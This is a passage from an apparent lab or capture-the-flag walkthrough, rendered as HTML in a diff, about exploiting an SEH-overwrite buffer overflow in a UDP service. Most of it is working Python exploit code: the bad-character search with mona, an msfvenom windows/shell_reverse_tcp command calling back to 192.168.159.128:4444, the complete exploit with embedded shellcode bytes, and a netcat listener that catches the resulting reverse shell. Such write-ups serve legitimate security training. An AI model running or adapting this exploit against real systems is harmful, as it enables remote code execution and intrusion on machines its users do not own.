+<span class="n">SEH</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;L'</span><span class="p">,</span> <span class="mh">0x10107716</span><span class="p">)</span>
+<span class="n">fill</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'D'</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nSEH</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">SEH</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">secure</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span>
+    <span class="n">nSEH</span> <span class="o">+</span>
+    <span class="n">SEH</span> <span class="o">+</span>
+    <span class="n">fill</span>
+<span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">data</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Respuesta:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Enviando payload..."</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"No hubo respuesta"</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<blockquote>
+<p>Successful short jump</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-18.png" data-desc-position="bottom"><img alt="alt text" src="img/image-18.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-19.png" data-desc-position="bottom"><img alt="alt text" src="img/image-19.png"></a></p>
+<h3 id="identifying-bad-characters">Identifying Bad Characters<a class="headerlink" href="#identifying-bad-characters" title="Permanent link">¶</a></h3>
+<p>To ensure the shellcode is not corrupted during processing, a complete byte array excluding the null byte was generated with Mona.</p>
+<div class="highlight"><pre><span></span><code>!mona<span class="w"> </span>bytearray<span class="w"> </span>-cpb<span class="w"> </span><span class="s1">'\x00'</span>
+</code></pre></div>
+<p>The generated byte array was appended to the payload and inspected in Immunity Debugger.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">'192.168.159.134'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">7778</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">basic</span><span class="se">\\</span><span class="s1">'</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="c1"># JMP SHORT +0x8 NOPNOP to fill the 4 bytes of nSEH</span>
+<span class="n">nSEH</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\xeb\x08\x90\x90</span><span class="s1">'</span>
+<span class="n">SEH</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;L'</span><span class="p">,</span> <span class="mh">0x10107716</span><span class="p">)</span>
+<span class="n">fill</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'D'</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nSEH</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">SEH</span><span class="p">))</span>
+
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">secure</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span>
+    <span class="n">nSEH</span> <span class="o">+</span>
+    <span class="n">SEH</span> <span class="o">+</span>
+    <span class="n">badchars</span> <span class="o">+</span>
+    <span class="n">fill</span>
+<span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">data</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Respuesta:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Enviando payload..."</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"No hubo respuesta"</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<blockquote>
+<p>Byte array in memory</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-20.png" data-desc-position="bottom"><img alt="alt text" src="img/image-20.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-21.png" data-desc-position="bottom"><img alt="alt text" src="img/image-21.png"></a></p>
+<p>During the comparison, the byte <code>0x5C</code> was identified as corrupted.</p>
+<p>A new byte array was generated excluding both bad characters.</p>
+<div class="highlight"><pre><span></span><code>!mona<span class="w"> </span>bytearray<span class="w"> </span>-cpb<span class="w"> </span><span class="s1">'\x00\x5C'</span>
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-24.png" data-desc-position="bottom"><img alt="alt text" src="img/image-24.png"></a></p>
+<p>After repeating the test, all remaining bytes were preserved correctly.</p>
+<p>The final bad character list was therefore:</p>
+<div class="highlight"><pre><span></span><code>00
+5C
+</code></pre></div>
+<blockquote>
+<p>Final byte comparison</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">'192.168.159.134'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">7778</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">basic</span><span class="se">\\</span><span class="s1">'</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="c1"># JMP SHORT +0x8 NOPNOP to fill the 4 bytes of nSEH</span>
+<span class="n">nSEH</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\xeb\x08\x90\x90</span><span class="s1">'</span>
+<span class="n">SEH</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;L'</span><span class="p">,</span> <span class="mh">0x10107716</span><span class="p">)</span>
+<span class="n">fill</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'D'</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nSEH</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">SEH</span><span class="p">))</span>
+
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f\x60\x61</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1</span><span class="s2">"</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">secure</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span>
+    <span class="n">nSEH</span> <span class="o">+</span>
+    <span class="n">SEH</span> <span class="o">+</span>
+    <span class="n">badchars</span> <span class="o">+</span>
+    <span class="n">fill</span>
+<span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">data</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Respuesta:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Enviando payload..."</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"No hubo respuesta"</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-22.png" data-desc-position="bottom"><img alt="alt text" src="img/image-22.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-23.png" data-desc-position="bottom"><img alt="alt text" src="img/image-23.png"></a></p>
+<h3 id="building-the-debugging-exploit">Building the Debugging Exploit<a class="headerlink" href="#building-the-debugging-exploit" title="Permanent link">¶</a></h3>
+<p>With the exploit parameters identified, the reverse TCP shellcode was generated using <code>msfvenom</code>.</p>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.159.128<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">EXECFUNC</span><span class="o">=</span>thread<span class="w"> </span>-f<span class="w"> </span>python<span class="w"> </span>-b<span class="w"> </span><span class="s1">'\x00\x5C'</span>
+</code></pre></div>
+<p>The final payload consisted of:</p>
+<ul>
+<li>SEH overwrite</li>
+<li>Short jump</li>
+<li>POP/POP/RET</li>
+<li>NOP sled</li>
+<li>Reverse shellcode</li>
+</ul>
+<p>Executing the exploit successfully redirected execution flow to the controlled buffer and spawned a reverse shell.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">'192.168.159.134'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">7778</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">basic</span><span class="se">\\</span><span class="s1">'</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="c1"># JMP SHORT +0x8 NOPNOP to fill the 4 bytes of nSEH</span>
+<span class="n">nSEH</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\xeb\x08\x90\x90</span><span class="s1">'</span>
+<span class="n">SEH</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;L'</span><span class="p">,</span> <span class="mh">0x10107716</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span> <span class="o">*</span> <span class="mi">16</span>
+
+<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xba\x4c\xf1\x15\x7b\xda\xd9\xd9\x74\x24\xf4\x5b</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x33\xc9\xb1\x52\x31\x53\x12\x83\xc3\x04\x03\x1f</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xff\xf7\x8e\x63\x17\x75\x70\x9b\xe8\x1a\xf8\x7e</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xd9\x1a\x9e\x0b\x4a\xab\xd4\x59\x67\x40\xb8\x49</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xfc\x24\x15\x7e\xb5\x83\x43\xb1\x46\xbf\xb0\xd0</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc4\xc2\xe4\x32\xf4\x0c\xf9\x33\x31\x70\xf0\x61</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xea\xfe\xa7\x95\x9f\x4b\x74\x1e\xd3\x5a\xfc\xc3</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xa4\x5d\x2d\x52\xbe\x07\xed\x55\x13\x3c\xa4\x4d</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x70\x79\x7e\xe6\x42\xf5\x81\x2e\x9b\xf6\x2e\x0f</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x13\x05\x2e\x48\x94\xf6\x45\xa0\xe6\x8b\x5d\x77</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x94\x57\xeb\x63\x3e\x13\x4b\x4f\xbe\xf0\x0a\x04</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xcc\xbd\x59\x42\xd1\x40\x8d\xf9\xed\xc9\x30\x2d</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x64\x89\x16\xe9\x2c\x49\x36\xa8\x88\x3c\x47\xaa</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x72\xe0\xed\xa1\x9f\xf5\x9f\xe8\xf7\x3a\x92\x12</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x08\x55\xa5\x61\x3a\xfa\x1d\xed\x76\x73\xb8\xea</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x79\xae\x7c\x64\x84\x51\x7d\xad\x43\x05\x2d\xc5</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x62\x26\xa6\x15\x8a\xf3\x69\x45\x24\xac\xc9\x35</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x84\x1c\xa2\x5f\x0b\x42\xd2\x60\xc1\xeb\x79\x9b</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x82\xd3\xd6\x3c\xd2\xbc\x24\x42\xc2\x60\xa0\xa4</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x8e\x88\xe4\x7f\x27\x30\xad\x0b\xd6\xbd\x7b\x76</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xd8\x36\x88\x87\x97\xbe\xe5\x9b\x40\x4f\xb0\xc1</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc7\x50\x6e\x6d\x8b\xc3\xf5\x6d\xc2\xff\xa1\x3a</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x83\xce\xbb\xae\x39\x68\x12\xcc\xc3\xec\x5d\x54</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x18\xcd\x60\x55\xed\x69\x47\x45\x2b\x71\xc3\x31</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xe3\x24\x9d\xef\x45\x9f\x6f\x59\x1c\x4c\x26\x0d</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xd9\xbe\xf9\x4b\xe6\xea\x8f\xb3\x57\x43\xd6\xcc</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x58\x03\xde\xb5\x84\xb3\x21\x6c\x0d\xc3\x6b\x2c</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x24\x4c\x32\xa5\x74\x11\xc5\x10\xba\x2c\x46\x90</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x43\xcb\x56\xd1\x46\x97\xd0\x0a\x3b\x88\xb4\x2c</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xe8\xa9\x9c</span><span class="s2">"</span>
+
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">secure</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span>
+    <span class="n">nSEH</span> <span class="o">+</span>
+    <span class="n">SEH</span> <span class="o">+</span>
+    <span class="n">padding</span> <span class="o">+</span>
+    <span class="n">buf</span>
+<span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">data</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Respuesta:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Enviando payload..."</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"No hubo respuesta"</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<blockquote>
+<p>Reverse shell</p>
+</blockquote>
+<p>After updating the exploit with the final shellcode, a Netcat listener was started on the attacker's machine.</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<p>The exploit was then executed against the vulnerable service.</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py
+</code></pre></div>
+<p>A reverse shell was successfully established.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-25.png" data-desc-position="bottom"><img alt="alt text" src="img/image-25.png"></a></p>
+<p>At this point, arbitrary code execution has been achieved, but the current privileges are insufficient to fully compromise the target system.</p>
+<p>The next objective is to escalate privileges to <strong>NT AUTHORITY\SYSTEM</strong>.</p>
+<h3 id="deploying-the-exploit">Deploying the Exploit<a class="headerlink" href="#deploying-the-exploit" title="Permanent link">¶</a></h3>
+<p>The exploit was intentionally developed inside an isolated debugging environment. Before using it against the target machine, several parameters must be updated.</p>
+<p>While reviewing the contents of the downloaded archive, an additional file named <strong>Readme.txt</strong> provides an important hint.</p>
+<div class="highlight"><pre><span></span><code>Internal note:
+
+Repeated failures were linked to overlapping UDP ports.
+
+Avoid using default configurations.
+
+Larger spacing between services (~1000) prevented further issues.
+</code></pre></div>
+<blockquote>
+<p>Readme.txt</p>
+</blockquote>
